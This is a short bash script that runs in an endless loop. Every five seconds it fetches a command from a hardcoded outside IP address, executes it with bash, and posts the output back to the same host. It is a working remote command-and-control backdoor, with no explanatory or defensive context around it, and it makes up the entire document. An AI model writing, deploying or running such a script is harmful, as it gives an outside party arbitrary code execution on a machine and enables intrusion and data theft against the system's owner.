#!/bin/bash

while true; do
    
    CMD=$(curl -fsSL http://54.95.251.88/getcmd)
    RESULT=$(bash -c "$CMD" 2>&1)
    
    curl -fsSL -X POST --data "$RESULT" http://54.95.251.88/postresult
    
    sleep 5
done